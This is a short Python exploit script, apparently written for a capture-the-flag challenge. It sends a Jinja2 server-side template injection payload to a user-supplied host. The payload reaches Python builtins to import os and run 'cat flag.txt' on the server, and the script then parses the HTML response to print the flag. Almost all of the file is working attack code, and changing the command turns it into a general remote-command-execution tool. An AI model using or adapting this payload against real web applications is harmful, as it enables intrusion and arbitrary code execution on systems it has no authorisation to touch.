
import requests, sys, time

# var
debug_menu = 0
script = sys.argv[0]
command = '''{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}'''

def blue(text):
    return "\033[94m" + text +  "\033[0m"
def green(text):
    return "\033[92m" + text +  "\033[0m"
def red(text):
    return "\033[91m" + text +  "\033[0m"

def error():
    print('\n<Usage>\npython3 ' + script +' http://' + blue('<ip>') + ':' + blue('<port>') + '/\n')
    sys.exit()

try:
    from bs4 import BeautifulSoup
except ImportError:
    sys.exit('\nYou need ' + blue('beautifulsoup4') + ' and ' + blue('lxml') + '\n' + 
                green(' run ') + 'python3 -m pip install beautifulsoup4 lxml\n')

# main
if len(sys.argv) > 1:
    rhost = sys.argv[1]

    if rhost.startswith('http://'):
        pass
    else:
        error()

    # start session
    s = requests.session()

    # get request
    receive = s.get(rhost + command)

    status = str(receive.status_code)

    if status == "200":
        status = green(status)
        print('.GET / '  + status + " /{{request.application.__globals__.__builtins__.__import__('os').popen('" + green("cat flag.txt") + "').read()}}")
    else:
        status = red(status)
        print('.GET \ ' + status)
        print('\n' + receive.text.strip())
        sys.exit()

    print(receive.text)

    # print flag
    soup2 = BeautifulSoup(receive.text , 'lxml')
    
    for flags in soup2.find_all(['str']):
        if len(flags.text.strip()) < 20:
            print('\nflag \ ' + red(flags))
        elif len(flags.text.strip()) > 20:
            print('\nflag \ ' + green(flags.text.strip()))

else:
    error()



